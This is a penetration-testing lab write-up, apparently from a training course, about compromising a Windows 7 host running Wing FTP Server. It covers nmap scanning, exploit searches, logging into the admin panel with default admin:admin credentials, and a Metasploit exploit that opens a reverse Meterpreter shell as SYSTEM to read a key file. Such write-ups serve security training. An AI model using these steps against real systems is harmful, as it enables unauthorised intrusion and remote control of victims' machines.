# Pentest 2 - Steven - 36 - 10.14.1.36

### Scanning  
First we will capture our report to 2/initial
                                         
```bash
nmap -Pn -sC -sV -oN 2/initial $STEVEN
Starting Nmap 7.92 ( https://nmap.org ) at 2023-07-27 18:07 EDT
Nmap scan report for 10.14.1.36
Host is up (0.17s latency).
Not shown: 998 filtered tcp ports (no-response)
PORT   STATE SERVICE VERSION
21/tcp open  ftp     Wing FTP Server
|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
| ftp-syst: 
|   STAT: 
| Status for user anonymous:
|     Connected for 0 minutes, 2 seconds
|     2 users online.
|     Uploaded 0 files, 0.000 KB, 0.000 KB/sec average
|     Downloaded 0 files, 0.000 KB, 0.000 KB/sec average
|_End of status.
80/tcp open  http    Wing FTP Server(Ferdi Bak)
| fingerprint-strings: 
|   FourOhFourRequest: 
|     HTTP/1.0 404 Not found
|     Server: Wing FTP Server(Ferdi Bak)
|     Cache-Control: private
|     Content-Type: application/octet-stream
|     Content-Length: 0
|     Connection: close
|   GetRequest, HTTPOptions, RTSPRequest: 
|     HTTP/1.0 200 HTTP OK
|     Server: Wing FTP Server(Ferdi Bak)
|     Cache-Control: private
|     Content-Type: text/html
|     Content-Length: 316
|     Connection: close
|     <noscript><center><H2>The web client requires that you have Javascript enabled on your browser.<br>If you're not sure how to do this, <a href='help_javascript.htm'>click here.</a></H2></center></noscript>
|_    <meta http-equiv='Content-Type' content='text/html; charset=utf-8'><script>top.location='login.html';</script>
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: Wing FTP Server(Ferdi Bak)
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
```

So we see FTP and 80 (http) open  
Additionally, we can see it's using "Wing FTP Server"  
Lets search and see if there is anything in searchsploit.  
Additionally since it's open on port 80, lets see if there is anything on the page?  
![Image1](/VHL/Reports/002/2_1.png)

Let's also see if we can determine what OS is being used:
```bash
sudo nmap -A -p 21,80 -Pn $STEVEN 
OS details: Microsoft Windows Server 2008 or 2008 Beta 3, Microsoft Windows Server 2008 R2 or Windows 8.1, Microsoft Windows 7 Professional or Windows 8, Microsoft Windows Embedded Standard 7, Microsoft Windows 8.1 R1, Microsoft Windows Phone 7.5 or 8.0, Microsoft Windows Vista SP0 or SP1, Windows Server 2008 SP1, or Windows 7, Microsoft Windows Vista SP2, Windows 7 SP1, or Windows Server 2008
```
So at this point we are guessing this is a windows server.  
Let's see what searchsploit and exploit-db have?  

```searchsploit wing
Wing FTP Server - (Authenticated) Command Execution (Metasploit)                                              | windows/remote/34517.rb
Wing FTP Server - Authenticated CSRF (Delete Admin)                                                           | php/webapps/48200.txt
Wing FTP Server 3.2.4 - Cross-Site Request Forgery                                                            | multiple/webapps/10821.txt
Wing FTP Server 6.0.7 - Unquoted Service Path                                                                 | windows/local/47818.txt
Wing FTP Server 6.2.3 - Privilege Escalation                                                                  | windows/local/48160.py
Wing FTP Server 6.2.5 - Privilege Escalation                                                                  | multiple/webapps/48154.sh
Wing FTP Server 6.3.8 - Remote Code Execution (Authenticated)                                                 | lua/webapps/48676.txt
Wing FTP Server Admin 4.4.5 - Cross-Site Request Forgery (Add User)                                           | php/webapps/36992.txt
Wing FTP Server Admin 4.4.5 - Multiple Vulnerabilities                                                        | windows/webapps/36861.txt
```

Since we know anonymous ftp is allowed, maybe we can try that?  
![Image2](/VHL/Reports/002/2_2.png)

So we know that we can get into the server using anonymous login (with no password). 
Can we do anything with this?   
I can't tell what version it is using despite being in the page.   
As an anonymous user, I don't have permissions to upload.  
Let's see if the exploits yield any success?  

Metasploit shows 1 good option:  
```bash
search wing
   11  exploit/windows/ftp/wing_ftp_admin_exec         2014-06-19       excellent  Yes    Wing FTP Server Authenticated Command Execution
```

This required admin credentials - I realized I didn't have admin credentials, and would not be able to utilize this exploit currently.  
Reviewing the internet for "Wing FTP server" however, tells me port 5466 and 7466 are also commonly used ports.  
Lets scan to see if these yield anything?  

```bash
sudo nmap -sS -Pn -p 5466,7466 $STEVEN
Starting Nmap 7.92 ( https://nmap.org ) at 2023-07-27 18:43 EDT
Nmap scan report for 10.14.1.36
Host is up (0.16s latency).

PORT     STATE    SERVICE
5466/tcp open     unknown
7466/tcp filtered unknown

Nmap done: 1 IP address (1 host up) scanned in 2.75 seconds
```

Indeed!  Let's see what is there.

```bash
sudo nmap -sV -Pn -p 5466,7466 $STEVEN
Starting Nmap 7.92 ( https://nmap.org ) at 2023-07-27 18:44 EDT
Nmap scan report for 10.14.1.36
Host is up (0.31s latency).

PORT     STATE    SERVICE VERSION
5466/tcp open     unknown
7466/tcp filtered unknown
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port5466-TCP:V=7.92%I=7%D=7/27%Time=64C2F367%P=x86_64-pc-linux-gnu%r(Ge
SF:nericLines,1E7,"HTTP/1\.0\x20200\x20HTTP\x20OK\r\nServer:\x20Wing\x20FT
```

It looks like we are getting a page response from one of these, so can we pull a page?  
10.14.1.36:7466 yields nothing , but 10.14.1.36:5466 gives us the admin page!  
Lets try admin:admin?   
Wow, I didn't expect that to work…  
![Image3](/VHL/Reports/002/2_3.png)

So right now, we have both a metasploit that can take an admin user/password, as well as FTP webpage administrator access.  
Lets try metasploit first to see where this gets us?  
```bash
msfconsole
use windows/ftp/wing_ftp_admin_exec
Show options -> 
Module options (exploit/windows/ftp/wing_ftp_admin_exec):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   PASSWORD                   yes       Admin password
   Proxies                    no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS                     yes       The target host(s), see https://github.com/rapid7/metasploit-framework/wiki/Using-Metasploit
   RPORT     5466             yes       The target port (TCP)
   SSL       false            no        Negotiate SSL/TLS for outgoing connections
   SSLCert                    no        Path to a custom SSL certificate (default is randomly generated)
   USERNAME                   yes       Admin username
   VHOST                      no        HTTP server virtual host


Payload options (windows/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     172.16.4.1       yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Wing FTP Server >= 3.0.0

msf6 exploit(windows/ftp/wing_ftp_admin_exec) > set password admin
password => admin
msf6 exploit(windows/ftp/wing_ftp_admin_exec) > set username admin
username => admin
msf6 exploit(windows/ftp/wing_ftp_admin_exec) > set RHOST 10.14.1.36
RHOST => 10.14.1.36

msf6 exploit(windows/ftp/wing_ftp_admin_exec) > exploit

[*] Started reverse TCP handler on 172.16.4.1:4444 
[*] Found Wing FTP Server 4.3.8
[+] Found Powershell at C:\Windows\System32\WindowsPowerShell\v1.0\
[*] Executing payload via PowerShell...
[*] Sending stage (175174 bytes) to 10.14.1.36
[*] Meterpreter session 1 opened (172.16.4.1:4444 -> 10.14.1.36:43156 ) at 2023-07-27 18:55:44 -0400

meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
meterpreter > pwd
C:\Windows\system32
meterpreter > sysinfo
Computer        : STEVEN-PC
OS              : Windows 7 (6.1 Build 7601, Service Pack 1).
Architecture    : x86
System Language : en_US
Domain          : WORKGROUP
Logged On Users : 2
Meterpreter     : x86/windows
```

### Searching for the key

From here, attempted to search for key.txt:  
```bash
search -f *key.txt
No files matching your search were found.
```

Ok, nothing returned, lets check the paths from the provided / listed for the course?
```bash
ls "C:\Documents and Settings\Administrator\Desktop"
Listing: C:\Documents and Settings\Administrator\Desktop
========================================================

Mode              Size  Type  Last modified              Name
----              ----  ----  -------------              ----
100666/rw-rw-rw-  282   fil   2017-05-22 06:22:27 -0400  desktop.ini
100666/rw-rw-rw-  20    fil   2017-05-22 06:23:21 -0400  key.txt.txt

meterpreter > cat C:\Documents and Settings\Administrator\Desktop\key.txt.txt
t70m5jaco2zy9vhqlb6s
meterpreter > 
```

There we go!
